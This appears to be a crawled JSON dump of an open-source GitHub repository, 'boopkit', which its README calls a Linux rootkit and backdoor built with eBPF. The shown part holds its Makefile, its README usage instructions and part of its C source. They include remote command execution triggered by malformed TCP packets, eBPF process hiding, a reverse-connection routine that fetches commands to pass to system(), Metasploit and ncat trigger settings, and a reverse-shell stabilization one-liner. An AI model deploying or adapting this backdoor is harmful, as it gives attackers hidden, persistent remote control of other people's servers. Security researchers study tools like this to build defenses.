{
  "metadata": {
    "timestamp": 1736710229749,
    "page": 957,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjk2MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "krisnova/boopkit",
      "stars": 1581,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0869140625,
          "content": ".idea\ncontrib*\nenohonk\n*.o\n*.ll\nboop/bookit-boop\nboopkit\npr0be.skel*\nvmlinux.h\nxdp-tools*"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 11.0908203125,
          "content": "                                 Apache License\n                           Version 2.0, January 2004\n                        http://www.apache.org/licenses/\n\n   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n\n   1. Definitions.\n\n      \"License\" shall mean the terms and conditions for use, reproduction,\n      and distribution as defined by Sections 1 through 9 of this document.\n\n      \"Licensor\" shall mean the copyright owner or entity authorized by\n      the copyright owner that is granting the License.\n\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n      outstanding shares, or (iii) beneficial ownership of such entity.\n\n      \"You\" (or \"Your\") shall mean an individual or Legal Entity\n      exercising permissions granted by this License.\n\n      \"Source\" form shall mean the preferred form for making modifications,\n      including but not limited to software source code, documentation\n      source, and configuration files.\n\n      \"Object\" form shall mean any form resulting from mechanical\n      transformation or translation of a Source form, including but\n      not limited to compiled object code, generated documentation,\n      and conversions to other media types.\n\n      \"Work\" shall mean the work of authorship, whether in Source or\n      Object form, made available under the License, as indicated by a\n      copyright notice that is included in or attached to the work\n      (an example is provided in the Appendix below).\n\n      \"Derivative Works\" shall mean any work, whether in Source or Object\n      form, that is based on (or derived from) the Work and for which the\n      editorial revisions, annotations, elaborations, or other modifications\n      represent, as a whole, an original work of authorship. For the purposes\n      of this License, Derivative Works shall not include works that remain\n      separable from, or merely link (or bind by name) to the interfaces of,\n      the Work and Derivative Works thereof.\n\n      \"Contribution\" shall mean any work of authorship, including\n      the original version of the Work and any modifications or additions\n      to that Work or Derivative Works thereof, that is intentionally\n      submitted to Licensor for inclusion in the Work by the copyright owner\n      or by an individual or Legal Entity authorized to submit on behalf of\n      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n      designated in writing by the copyright owner as \"Not a Contribution.\"\n\n      \"Contributor\" shall mean Licensor and any individual or Legal Entity\n      on behalf of whom a Contribution has been received by Licensor and\n      subsequently incorporated within the Work.\n\n   2. Grant of Copyright License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      copyright license to reproduce, prepare Derivative Works of,\n      publicly display, publicly perform, sublicense, and distribute the\n      Work and such Derivative Works in Source or Object form.\n\n   3. Grant of Patent License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      (except as stated in this section) patent license to make, have made,\n      use, offer to sell, sell, import, and otherwise transfer the Work,\n      where such license applies only to those patent claims licensable\n      by such Contributor that are necessarily infringed by their\n      Contribution(s) alone or by combination of their Contribution(s)\n      with the Work to which such Contribution(s) was submitted. If You\n      institute patent litigation against any entity (including a\n      cross-claim or counterclaim in a lawsuit) alleging that the Work\n      or a Contribution incorporated within the Work constitutes direct\n      or contributory patent infringement, then any patent licenses\n      granted to You under this License for that Work shall terminate\n      as of the date such litigation is filed.\n\n   4. Redistribution. You may reproduce and distribute copies of the\n      Work or Derivative Works thereof in any medium, with or without\n      modifications, and in Source or Object form, provided that You\n      meet the following conditions:\n\n      (a) You must give any other recipients of the Work or\n          Derivative Works a copy of this License; and\n\n      (b) You must cause any modified files to carry prominent notices\n          stating that You changed the files; and\n\n      (c) You must retain, in the Source form of any Derivative Works\n          that You distribute, all copyright, patent, trademark, and\n          attribution notices from the Source form of the Work,\n          excluding those notices that do not pertain to any part of\n          the Derivative Works; and\n\n      (d) If the Work includes a \"NOTICE\" text file as part of its\n          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n          within a display generated by the Derivative Works, if and\n          wherever such third-party notices normally appear. The contents\n          of the NOTICE file are for informational purposes only and\n          do not modify the License. You may add Your own attribution\n          notices within Derivative Works that You distribute, alongside\n          or as an addendum to the NOTICE text from the Work, provided\n          that such additional attribution notices cannot be construed\n          as modifying the License.\n\n      You may add Your own copyright statement to Your modifications and\n      may provide additional or different license terms and conditions\n      for use, reproduction, or distribution of Your modifications, or\n      for any such Derivative Works as a whole, provided Your use,\n      reproduction, and distribution of the Work otherwise complies with\n      the conditions stated in this License.\n\n   5. Submission of Contributions. Unless You explicitly state otherwise,\n      any Contribution intentionally submitted for inclusion in the Work\n      by You to the Licensor shall be under the terms and conditions of\n      this License, without any additional terms or conditions.\n      Notwithstanding the above, nothing herein shall supersede or modify\n      the terms of any separate license agreement you may have executed\n      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n   7. Disclaimer of Warranty. Unless required by applicable law or\n      agreed to in writing, Licensor provides the Work (and each\n      Contributor provides its Contributions) on an \"AS IS\" BASIS,\n      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n      implied, including, without limitation, any warranties or conditions\n      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A\n      PARTICULAR PURPOSE. You are solely responsible for determining the\n      appropriateness of using or redistributing the Work and assume any\n      risks associated with Your exercise of permissions under this License.\n\n   8. Limitation of Liability. In no event and under no legal theory,\n      whether in tort (including negligence), contract, or otherwise,\n      unless required by applicable law (such as deliberate and grossly\n      negligent acts) or agreed to in writing, shall any Contributor be\n      liable to You for damages, including any direct, indirect, special,\n      incidental, or consequential damages of any character arising as a\n      result of this License or out of the use or inability to use the\n      Work (including but not limited to damages for loss of goodwill,\n      work stoppage, computer failure or malfunction, or any and all\n      other commercial damages or losses), even if such Contributor\n      has been advised of the possibility of such damages.\n\n   9. Accepting Warranty or Additional Liability. While redistributing\n      the Work or Derivative Works thereof, You may choose to offer,\n      and charge a fee for, acceptance of support, warranty, indemnity,\n      or other liability obligations and/or rights consistent with this\n      License. However, in accepting such obligations, You may act only\n      on Your own behalf and on Your sole responsibility, not on behalf\n      of any other Contributor, and only if You agree to indemnify,\n      defend, and hold each Contributor harmless for any liability\n      incurred by, or claims asserted against, such Contributor by reason\n      of your accepting any such warranty or additional liability.\n\n   END OF TERMS AND CONDITIONS\n\n   APPENDIX: How to apply the Apache License to your work.\n\n      To apply the Apache License to your work, attach the following\n      boilerplate notice, with the fields enclosed by brackets \"[]\"\n      replaced with your own identifying information. (Don't include\n      the brackets!)  The text should be enclosed in the appropriate\n      comment syntax for the file format. We also recommend that a\n      file or class name and description of purpose be included on the\n      same \"printed page\" as the copyright notice for easier\n      identification within third-party archives.\n\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 3.9814453125,
          "content": "# Copyright © 2022 Kris Nóva <kris@nivenly.com>\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n# ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n# ██╔██╗ ██║██║██╔██║██║   ██║███████║\n# ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n# ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n# ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n#\nTARGET  := boopkit\nCFLAGS  ?= -I/usr/local/include -g\nLDFLAGS ?=\nLIBS     = -lbpf -lelf -lpcap -lpthread\nSTYLE    = Google\n\nall: pr0be skeleton build ## Build everything\n\n.PHONY: clean\nclean: ## Clean objects\n\trm -vf $(TARGET)\n\trm -vf *.o\n\trm -vf *.ll\n\trm -vf pr0be.skel*\n\trm -vf vmlinux.h\n\tcd contrib && ls | grep -v dep | xargs rm -vfr\n\trm -vrf xdp-tools/*\n\n.PHONY: boop\nboop:  ## Build trigger program\n\t@echo \"  ->  Building trigger program\"\n\tcd boop && make\n\nskeleton: pr0be ## Generate eBPF dynamic skeleton headers\n\t@echo \"  ->  Generating pr0be.skel.safe.h\"\n\tbpftool gen skeleton pr0be.safe.o -p > pr0be.skel.safe.h\n\tbpftool gen skeleton pr0be.xdp.o -p > pr0be.skel.xdp.h\n\nxdptools:\n\t@echo \"Git clone xdp-tools...\"\n\tgit clone git@github.com:xdp-project/xdp-tools.git\n\nformat: ## Format the code\n\t@echo \"  ->  Formatting code\"\n\t@clang-format -i -style=$(STYLE) *.c *.h\n\t@clang-format -i -style=$(STYLE) boop/*.c boop/*.h\n\nbuild: boop ## Build boopkit userspace program\n\t@echo \"  ->  Building boopkit\"\n\tclang $(CFLAGS) $(LDFLAGS) $(LIBS) -o $(TARGET) boopkit.c common.c dpi.c -Wl,\n\n.PHONY: contrib\ncontrib: ## Build static dependencies\n\t@echo \"  ->  Boopkit static dependencies\"\n\t@cd contrib && ./deps\n\n\nstatic: ## Build boopkit userspace program (static)\n\t@echo \"  ->  Building boopkit\"\n\tgcc $(CFLAGS) $(LDFLAGS) $(LIBS) -static -o $(TARGET) boopkit.c common.c dpi.c -Wl,\n\ninstall: ## Install boopkit to /usr/bin/boopkit\n\tcp $(TARGET) /usr/bin/$(TARGET)\n\tcp boop/boopkit-boop /usr/bin/boopkit-boop\n\t@mkdir -p ${HOME}/.boopkit\n\tcp pr0be.safe.o ${HOME}/.boopkit/pr0be.safe.o\n\tcp pr0be.boop.o ${HOME}/.boopkit/pr0be.boop.o\n\tcp pr0be.xdp.o ${HOME}/.boopkit/pr0be.xdp.o\n\n\n.PHONY: pr0be\npr0be: autogen pr0be.boop.o pr0be.safe.o pr0be.xdp.o ## Compile eBPF probes\n\t@echo \"  ->  Building eBPF pr0bes\"\n\nautogen:\n\tbpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h\n\npr0be.boop.o: pr0be.boop.c\n\t@echo \"  ->  Building pr0be.boop.o\"\n\tclang -S \\\n\t    -target bpf \\\n\t    -D __BPF_TRACING__ \\\n\t    $(CFLAGS) \\\n\t    -Wall \\\n\t    -Werror \\\n\t    -O2 -emit-llvm -c -g pr0be.boop.c\n\tllc -march=bpf -filetype=obj -o pr0be.boop.o pr0be.boop.ll\n\npr0be.safe.o: pr0be.safe.c\n\t@echo \"  ->  Building pr0be.safe.o\"\n\tclang -S \\\n\t    -target bpf \\\n\t    -D __BPF_TRACING__ \\\n\t    $(CFLAGS) \\\n\t    -Wall \\\n\t    -Werror \\\n\t    -O2 -emit-llvm -c -g pr0be.safe.c\n\tllc -march=bpf -filetype=obj -o pr0be.safe.o pr0be.safe.ll\n\npr0be.xdp.o: pr0be.xdp.c\n\t@echo \"  ->  Building pr0be.xdp.o\"\n\tclang -S \\\n\t    -target bpf \\\n\t    -D __BPF_TRACING__ \\\n\t    $(CFLAGS) \\\n\t    -Wall \\\n\t    -Werror \\\n\t    -O2 -emit-llvm -c -g pr0be.xdp.c\n\tllc -march=bpf -filetype=obj -o pr0be.xdp.o pr0be.xdp.ll\n\n\n.PHONY: help\nhelp:  ## Show help messages for make targets\n\t@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(firstword $(MAKEFILE_LIST)) | sort | awk 'BEGIN {FS = \":.*?## \"}; {printf \"\\033[32m%-30s\\033[0m %s\\n\", $$1, $$2}'\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 7.306640625,
          "content": "```\n================================================================\n\n    ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n    ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n    ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n    ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n    ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n    ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n    Author: Kris Nóva <kris@nivenly.com> Version 1.4.0\n    \n    IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n    EXEMPLARY, OR CONSEQUENTIAL DAMAGES.    \n\n    DO NOT ATTEMPT TO USE THE TOOLS TO VIOLATE THE LAW.\n    THE AUTHOR IS NOT RESPONSIBLE FOR ANY ILLEGAL ACTION.\n    MISUSE OF THE SOFTWARE, INFORMATION, OR SOURCE CODE\n    MAY RESULT IN CRIMINAL CHARGES.\n    \n    Use at your own risk.\n\n================================================================\n\nBoopkit.\nLinux rootkit and backdoor. Built using eBPF.\n\nUsage: \nboopkit [options]\n\nOptions:\n-h, help           Display help and usage for boopkit.\n-i, interface      Interface name. lo, eth0, wlan0, etc\n-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n-r, reverse-conn   Attempt a reverse RCE lookup if no payload found.\n-q, quiet          Disable output.\n-x, reject         Source addresses to reject triggers from.\n\n```\n\nLinux backdoor, rootkit, and eBPF bypass tools.\nRemote command execution over raw TCP.\n\n - Tested on Linux kernel 5.16\n - Tested on Linux kernel 5.17\n - Remote code execution over TCP (SSH, Nginx, Kubernetes, etc)\n - Network gateway bypass (bad checksums, TCP reset)\n - Self obfuscation at runtime (eBPF process hiding)\n\n##### Disclaimer\n\n> This is **NOT** an exploit! This requires prior privileged access on a server in order to work!\n> I am a professional security researcher. These are white hat tools used for research purposes only.\n> Use this responsibly. Never use this software illegally.\n\n![FSpgEXTacAYme8t](https://user-images.githubusercontent.com/13757818/168698377-9c1125d6-698d-4009-a599-56b275b54764.jpeg)\n\n## Server Side\n\nDownload and build boopkit.\n\n```bash\nwget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.3.0.tar.gz\ntar -xzf v1.3.0.tar.gz \ncd boopkit-1.3.0/\nmake\nsudo make install\n```\n\nRun boopkit in the foreground. \n\n```bash \n# Reject all boops on localhost and 10.0.0.1\nboopkit -x 127.0.0.1 -x 10.0.0.1\n```\n\nRun boopkit in the background in quiet mode.\n\n```bash \n# Danger! This can be VERY hard to stop! Run this at your own risk!\nboopkit -q &\n```\n\nBoopkit is now running and can be exploited using the client `boopkit-boop` command line tool.\n\n## Client Side\n\nDownload and build boopkit.\n\n```bash\nwget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.2.0.tar.gz\ntar -xzf v1.2.0.tar.gz \ncd boopkit-1.2.0/\nmake\nsudo make install\n```\nRun boopkit-boop against the server.\n\n```bash \n# ===================\nRCE=\"ls -la\"\n# ===================\nLHOST=\"127.0.0.1\"\nLPORT=\"3535\"\nRHOST=\"127.0.0.1\"\nRPORT=\"22\"\nboopkit-boop \\\n  -lhost $LHOST \\\n  -lport $LPORT \\\n  -rhost $RHOST \\\n  -rport $RPORT \\\n  -c \"$RCE\"\n```\n\n# Boop Vectors\n\nBoopkit will respond to various events on the network. Both of which can be triggered with the `boopkit-boop` tool.\n\nTCP Header Format. Taken from [RFC 793](https://datatracker.ietf.org/doc/html/rfc793#section-3.1). September 1981\n```\n        0                   1                   2                   3\n        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n       |          Source Port          |       Destination Port        |\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n       |                        Sequence Number                        |\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n       |                    Acknowledgment Number                      |\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n       |  Data |           |U|A|P|R|S|F|                               |\n       | Offset| Reserved  |R|C|S|S|Y|I|            Window             |\n       |       |           |G|K|H|T|N|N|                               |\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n       |           Checksum            |         Urgent Pointer        |\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n       |                    Options                    |    Padding    |\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n       {                             data                              }\n       {                             ....                              }\n       {                             data                              }\n       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n```\n\n### 1. Bad Checksum\n\nFirst the `boopkit-boop` tool will send a malformed TCP SYN packet with an empty checksum to the server over a `SOCK_RAW` socket. This will trigger `boopkit` remotely regardless of what TCP services are running. This works against any Linux server running boopkit, regardless of the state of TCP services.\n\nUse `-p` with `boopkit-boop` to only use this first vector.\n\n⚠️ Some modern network hardware will DROP all malformed checksum packets such as the one required to exploit boopkit using this vector!\n\n### 2. Sending ACK-RST packet\n\nNext the `boopkit-boop` tool will complete a valid TCP handshake with a `SOCK_STREAM` socket against a remote TCP service such as SSH, Kubernetes, Nginx, etc. After the initial TCP handshake is complete, `boopkit-boop` will repeat the process a 2nd time.\nThe 2nd handshake will flip the TCP reset flag in the packet, trigger a TCP reset on the server.\n\nEither of these tactics are enough to independently trigger boopkit.\nVarious network hardware and runtime conditions will make either tactic more viable.\nBoopkit will try both, and respond to both by default.\n\n# Boopscript\n\nThe `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed on a remote Linux machine.\n\n```bash\n# boopscript\nRHOST=\"127.0.0.1\"\nRPORT=\"22\"\nLHOST=\"127.0.0.1\"\nLPORT=\"3535\"\n\nNCAT=\"/usr/bin/ncat\"\nNCATLISTENPORT=\"3545\"\n```\n\n### Compile Time Dependencies \n\n - 'clang' \n - 'bpftool'   Required for `libbpf`\n - 'xdp-tools' Required for `libxdp`\n - 'llvm'\n - 'pcap'\n - 'lib32-glibc'\n\n### Reverse Shell Stabilization\n\n```bash\npython -c \"import pty; pty.spawn('/bin/bash')\"\n```\n\n### References\n\n - [Tracepoints with BPF](https://lwn.net/Articles/683504/)\n - [Raw TCP Sockets](https://github.com/MaxXor/raw-sockets-example)\n - [Bad BPF](https://github.com/pathtofile/bad-bpf)\n\nCredit to the original authors for their helpful code samples! I forked a lot of code for this project! \n"
        },
        {
          "name": "boop",
          "type": "tree",
          "content": null
        },
        {
          "name": "boopkit.c",
          "type": "blob",
          "size": 13.8291015625,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n// [boopkit.c]\n//\n// Where the main() function goes down.\n\n#include <arpa/inet.h>\n#include <bpf/bpf.h>\n#include <bpf/btf.h>\n#include <bpf/libbpf.h>  // libbpf\n#include <errno.h>\n#include <limits.h>\n#include <linux/types.h>\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\n// clang-format off\n#include \"boopkit.h\"\n#include \"common.h\"\n#include \"dpi.h\"\n#include \"pr0be.skel.safe.h\"\n#include \"pr0be.skel.xdp.h\"\n// clang-format on\n\nint runtime__boopkit = 1;\n\nvoid usage() {\n  asciiheader();\n  boopprintf(\"\\nBoopkit.\\n\");\n  boopprintf(\"Linux rootkit and backdoor. Built using eBPF.\\n\");\n  boopprintf(\"\\n\");\n  boopprintf(\"Usage: \\n\");\n  boopprintf(\"boopkit [options]\\n\");\n  boopprintf(\"\\n\");\n  boopprintf(\"Options:\\n\");\n  boopprintf(\"-h, help           Display help and usage for boopkit.\\n\");\n  boopprintf(\"-i, interface      Interface name. lo, eth0, wlan0, etc\\n\");\n  boopprintf(\"-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\\n\");\n  boopprintf(\n      \"-r, reverse-conn   Attempt reverse RCE lookup if no payload found.\\n\");\n  boopprintf(\"-q, quiet          Disable output.\\n\");\n  boopprintf(\"-x, reject         Source addresses to reject triggers from.\\n\");\n  boopprintf(\"-p, protect        Protect from executing commands. Safe mode.\\n\");\n  boopprintf(\"\\n\");\n  exit(0);\n}\n\n/**\n * recvrce is a last resort attempt to reverse dial for an RCE from a\n * boopkit-boop client.\n *\n * This can be opted-in by passing -r to boopkit.\n *\n * @param dial IP address to reverse connect\n * @param rce\n * @return 1 success, 0 failure\n */\nint recvrce(char dial[INET_ADDRSTRLEN], char *rce) {\n  struct sockaddr_in daddr;\n  daddr.sin_family = AF_INET;\n  daddr.sin_port = htons(PORT);\n  if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {\n    boopprintf(\" XX Destination IP configuration failed.\\n\");\n    return 0;\n  }\n\n  int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n  if (revsock == -1) {\n    return 0;\n  }\n\n  struct timeval retry;\n  int retval;\n  retry.tv_sec = TIMEOUT_SECONDS_RECVRCE;\n  retry.tv_usec = 0;\n  retval = setsockopt(revsock, SOL_SOCKET, SO_SNDTIMEO,\n                      (struct timeval *)&retry, sizeof(struct timeval));\n  if (retval != 0) {\n    boopprintf(\"Error (%d) setting socket SO_SNDTIMEO: %s\\n\", retval,\n               strerror(errno));\n    return 0;\n  }\n  retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO,\n                      (struct timeval *)&retry, sizeof(struct timeval));\n  if (retval != 0) {\n    boopprintf(\"Error (%d) setting socket SO_RCVTIMEO: %s\\n\", retval,\n               strerror(errno));\n    return 0;\n  }\n\n  if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {\n    return 0;\n  }\n\n  char buffer[MAX_RCE_SIZE];\n  read(revsock, buffer, MAX_RCE_SIZE);\n  close(revsock);\n  strncpy(rce, buffer, MAX_RCE_SIZE);\n  return 1;\n}\n\n/**\n * config is the CLI options that are used throughout boopkit\n */\nstruct config {\n  int sudobypass;\n  char pr0besafepath[PATH_MAX];\n  char pr0bebooppath[PATH_MAX];\n  char pr0bexdppath[PATH_MAX];\n  char dev_name[16];\n  int denyc;\n  int protect;\n  int reverseconn;\n  char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];\n} cfg;\n\n/**\n * clisetup is used to initalize the program from the command line\n *\n * @param argc\n * @param argv\n */\nvoid clisetup(int argc, char **argv) {\n  cfg.denyc = 0;\n  cfg.reverseconn = 0;\n  cfg.protect = 0;\n  cfg.sudobypass = 0;\n  strncpy(cfg.dev_name, DEFAULT_PCAP_INTERFACE, 16);\n  if (getenv(\"HOME\") == NULL) {\n    strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);\n    strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);\n    strncpy(cfg.pr0bexdppath, PROBE_XDP, sizeof PROBE_XDP);\n  } else {\n    sprintf(cfg.pr0besafepath, \"%s/.boopkit/%s\", getenv(\"HOME\"), PROBE_SAFE);\n    sprintf(cfg.pr0bebooppath, \"%s/.boopkit/%s\", getenv(\"HOME\"), PROBE_BOOP);\n    sprintf(cfg.pr0bexdppath, \"%s/.boopkit/%s\", getenv(\"HOME\"), PROBE_XDP);\n  }\n  for (int i = 0; i < argc; i++) {\n    if (argv[i][0] == '-') {\n      switch (argv[i][1]) {\n        case 's':\n          cfg.sudobypass = 1;\n          break;\n        case 'x':\n          strcpy(cfg.deny[cfg.denyc], argv[i + 1]);\n          cfg.denyc++;\n          break;\n        case 'h':\n          usage();\n          break;\n        case 'r':\n          cfg.reverseconn = 1;\n          break;\n        case 'i':\n          strcpy(cfg.dev_name, argv[i + 1]);\n          break;\n        case 'q':\n          quiet = 1;\n          break;\n        case 'p':\n          cfg.protect = 1;\n          break;\n      }\n    }\n  }\n}\n\n/**\n * Shared memory with the kernel\n */\nstatic struct env {\n  int pid_to_hide;\n  int target_ppid;\n} env;\n\n/**\n * cb_pid_lookup is a callback function for PID lookup at runtime\n * used in obfuscating boopkit from the rest of the kernel.\n *\n * @param ctx\n * @param data\n * @param data_sz\n * @return\n */\nstatic int cb_pid_lookup(void *ctx, void *data, size_t data_sz) {\n  // const struct event *e = data;\n  return 0;\n}\n\n/**\n * uid_check is used to check the runtime construct of boopkit\n *\n * Ideally boopkit is ran without sudo as uid=0 (root)\n *\n * @param argc\n * @param argv\n */\nvoid uid_check(int argc, char **argv) {\n  long luid = (long)getuid();\n  if (luid != 0) {\n    boopprintf(\"  XX Invalid UID.\\n\");\n    if (!cfg.sudobypass) {\n      boopprintf(\"  XX Permission denied.\\n\");\n      exit(1);\n    }\n    boopprintf(\"  XX sudo bypass enabled! PID obfuscation will not work!\\n\");\n  }\n  long lpid = (long)getpid();\n  long lppid = (long)getppid();\n  if (lpid - lppid == 1) {\n    // We assume we are running with sudo at this point!\n    // If the ppid() and pid() are close together this\n    // implies that the process tree has cascaded a new\n    // ppid() for the process. In other words, we are probably\n    // running with sudo (or similar).\n    boopprintf(\n        \"  XX Running as cascaded pid (sudo) is invalid for obfuscation.\\n\");\n    if (!cfg.sudobypass) {\n      boopprintf(\"  XX Permission denied.\\n\");\n      exit(1);\n    }\n    boopprintf(\"  XX sudo bypass enabled! PID obfuscation will not work!\\n\");\n  }\n  boopprintf(\"  -> getuid()                : %ld\\n\", luid);\n  boopprintf(\"  -> getpid()                : %ld\\n\", lpid);\n  boopprintf(\"  -> getppid()               : %ld\\n\", lppid);\n}\n\n/**\n * exec is where the magic happens.\n *\n * @param rce\n * @return\n */\nint exec(char *rce) {\n  char *ret;\n  ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);\n  if (ret) {\n    runtime__xcap = 0;     // Stop the xcap loop\n    runtime__boopkit = 0;  // Stop the boopkit loop\n    boopprintf(\"  XX Halting boopkit: %s\\n\", BOOPKIT_RCE_CMD_HALT);\n    free(rce);\n    return 0;\n  }\n  boopprintf(\"  -> Found RCE: %s\\n\", rce);\n  if (!cfg.protect){\n    boopprintf(\"  <- Executing: %s\\n\", rce);\n    system(rce);  // :)\n  }else {\n    boopprintf(\"  XX Bypassing execution! Running in protect mode. Safe mode.\\n\");\n  }\n  free(rce);\n  return 1;\n}\n\n/**\n * main\n *\n * @param argc\n * @param argv\n * @return\n */\nint main(int argc, char **argv) {\n  clisetup(argc, argv);\n  asciiheader();\n  uid_check(argc, argv);\n  boopprintf(\"  -> Logs                    : /sys/kernel/tracing/trace_pipe\\n\");\n\n  int loaded, err;\n  struct bpf_object *bpobj;\n  struct pr0be_safe *sfobj;\n  struct bpf_program *progboop = NULL;\n  struct ring_buffer *rb = NULL;\n  char pid[16];\n\n  {\n    // Start a new thread for DPI. @zomgwtfbbqkewl\n    pthread_t th;\n    pthread_create(&th, NULL, xcap, (void *)cfg.dev_name);\n  }\n\n  if (cfg.protect) {\n    boopprintf(\"  -> Running in (protect) safe mode. Will not execute commands!\\n\");\n  }\n\n  // 